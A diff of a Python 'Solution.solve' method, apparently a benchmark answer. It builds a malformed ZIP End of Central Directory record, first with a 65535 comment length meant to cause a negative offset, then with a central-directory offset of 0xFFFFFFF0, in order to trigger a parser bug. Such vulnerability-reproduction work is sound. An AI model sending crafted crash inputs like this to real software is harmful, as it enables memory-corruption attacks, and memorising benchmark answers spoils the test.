@@ -1,16 +1,17 @@
-import os
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        filler = b"\x00" * 24
-        eocd = (
-            b"PK\x05\x06"      # End of Central Directory signature
-            b"\x00\x00"        # number of this disk
-            b"\x00\x00"        # disk with start of central directory
-            b"\x00\x00"        # total entries on this disk
-            b"\x00\x00"        # total entries
-            b"\x00\x00\x00\x00"  # size of the central directory
-            b"\x00\x00\x00\x00"  # offset of start of central directory
-            b"\xff\xff"        # comment length = 65535 (triggers negative offset)
+        filler = b"A" * 24
+        eocd = struct.pack(
+            "<IHHHHIIH",
+            0x06054B50,  # End of central directory signature
+            0,           # Number of this disk
+            0,           # Disk where central directory starts
+            1,           # Number of central directory records on this disk
+            1,           # Total number of central directory records
+            0,           # Size of central directory
+            0xFFFFFFF0,  # Offset of start of central directory w.r.t. starting disk
+            0            # .ZIP file comment length
         )
         return filler + eocd
